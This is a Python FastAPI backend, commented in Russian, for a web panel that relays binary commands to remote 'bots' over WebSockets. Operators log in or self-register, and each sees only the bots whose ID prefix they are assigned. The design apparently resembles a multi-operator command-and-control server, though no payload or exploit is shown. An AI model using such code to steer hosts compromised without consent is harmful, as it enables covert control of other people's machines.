import uvicorn, asyncio, json
from pathlib import Path
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, Query, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

from .Database import verify_user, register_user, load_db, load_bots_from_file, get_login_by_token, generate_token
from backend.Services import send_binary_to_bot
from logs import Log as logger


# ==========================================
# БЛОК 1: УПРАВЛЕНИЕ WEB-ПОДКЛЮЧЕНИЯМИ
# ==========================================
class ConnectionManager:
    def __init__(self):
        self.active = {}  # {login: {"sockets": [], "role": str, "prefix": str}}

    async def connect(self, ws, login, user):
        await ws.accept()
        self.active.setdefault(login, {
            "sockets": [],
            "role": user["role"],
            "prefix": user["prefix"]
        })["sockets"].append(ws)
        logger.info(f"[API] [+] {login} подключен")

    def disconnect(self, ws, login):
        if login in self.active:
            if ws in self.active[login]["sockets"]:
                self.active[login]["sockets"].remove(ws)
            if not self.active[login]["sockets"]:
                self.active.pop(login)
        logger.info(f"[API] [-] {login} отключен")

    async def broadcast_packet(self, packet: bytes):
        """Прямая трансляция бинарного пакета разрешенным пользователям."""
        if not packet or not self.active: return
        try:
            # Наш протокол: [id_len(1)][mod_len(1)][pay_len(4)]
            id_len = packet[0]
            # ID начинается с 6-го байта (пропускаем заголовок тех-карты)
            bot_id = packet[6:6 + id_len].decode(errors='ignore')
            bot_prefix = bot_id.split('-')[0]

            for login, session in self.active.items():
                # Проверка прав: Admin или совпадение префикса
                if session["role"] == "admin" or session["prefix"] == "ALL" or session["prefix"] == bot_prefix:
                    for ws in session["sockets"]:
                        # Отправляем весь пакет целиком (6б + тело) на фронтенд
                        asyncio.create_task(self.safe_send(ws, packet))
        except Exception as e:
            logger.error(f"[Broadcast Error] {e}")

    async def safe_send(self, ws, packet: bytes):
        try:
            await ws.send_bytes(packet)
        except:
            pass


manager = ConnectionManager()


# ==========================================
# БЛОК 2: ВСПОМОГАТЕЛЬНЫЕ ИНСТРУМЕНТЫ
# ==========================================
def pack_bot_command(bot_id: str, mod: str, payload: str):
    """Универсальная упаковка для API: [6 байт Header] + [Тело]"""
    b_id = bot_id.encode('utf-8')
    b_mod = mod.encode('utf-8')
    b_pay = payload.encode('utf-8')

    # Строго 6 байт: 1+1+4
    header = (
        len(b_id).to_bytes(1, 'big') +
        len(b_mod).to_bytes(1, 'big') +
        len(b_pay).to_bytes(4, 'big')
    )
    return header + b_id + b_mod + b_pay


def has_access(user, target_id):
    """Проверка прав доступа пользователя к конкретному боту."""
    return user["role"] == "admin" or user["prefix"] == "ALL" or target_id.startswith(user["prefix"])


# ==========================================
# БЛОК 3: КОНФИГУРАЦИЯ FASTAPI
# ==========================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Теперь здесь пусто, ZMQ Dispatcher удален
    yield


app = FastAPI(lifespan=lifespan)

# Статика (Админка)
FRONTEND_PATH = Path(__file__).resolve().parent.parent.parent / "frontend"
app.mount("/sidebar", StaticFiles(directory=FRONTEND_PATH, html=True), name="static")


@app.get("/")
async def root(): return RedirectResponse("/sidebar/auth/auth.html")


# ==========================================
# БЛОК 4: AUTH API (HTTP)
# ==========================================
@app.get("/verify_token")
async def verify(token: str = Query(None)):
    login = get_login_by_token(token)
    return {"status": "ok", "login": login} if login else JSONResponse(status_code=401, content={"status": "err"})


@app.post("/{action}")
async def auth(action: str, data=Body(...)):
    login, pwd = data.get("login"), data.get("password")
    if action == "register":
        return {"status": "ok"} if register_user(login, pwd) else {"status": "error"}

    user = verify_user(login, pwd)
    if user:
        token = generate_token(login)
        return {"status": "ok", "token": token, "role": user["role"], "prefix": user["prefix"]}
    return {"status": "error", "message": "Invalid credentials"}


# ==========================================
# БЛОК 5: REAL-TIME HUB (WEBSOCKET)
# ==========================================
@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket, token: str = Query(None), login: str = Query(None),
                             mode: str = Query(None)):
    user_login = get_login_by_token(token)
    if not user_login or user_login != login:
        await ws.accept()
        return await ws.close(1008)

    user = load_db().get(user_login)
    await manager.connect(ws, user_login, user)

    try:
        # Инициализация списка ботов из БД
        if mode != "control":
            bots = load_bots_from_file()
            for bid, data in bots.items():
                if has_access(user, bid):
                    # Отправляем данные из БД и сразу пингуем бота для обновления
                    await ws.send_bytes(pack_bot_command(bid, "DataScribe", json.dumps(data)))
                    asyncio.create_task(send_binary_to_bot(bid, pack_bot_command(bid, "DataScribe", "get_metadata")))

        while True:
            msg = await ws.receive()
            if "bytes" in msg:
                pkt = msg["bytes"]
                if len(pkt) < 6: continue

                target_id = pkt[6:6 + pkt[0]].decode(errors='ignore').strip()

                # Игнорируем пустые ID (системный пинг от фронтенда)
                if not target_id: continue

                if has_access(user, target_id):
                    # ЛОГ 1: Отправка команды от админа конкретному боту
                    logger.info(f"[WS] UI -> Bot: {target_id} | Pkt: {len(pkt)} bytes")

                    if not await send_binary_to_bot(target_id, pkt):
                        logger.warning(f"[WS] Bot {target_id} offline")

    except Exception as e:
        # ЛОГ 2: Системный лог отключения или ошибки сессии
        logger.info(f"[WS] Session closed for {user_login}: {e}")
    finally:
        manager.disconnect(ws, user_login)


async def run_fastapi_server(host, port):
    config = uvicorn.Config(app, host=host, port=port, log_level="warning")
    await uvicorn.Server(config).serve()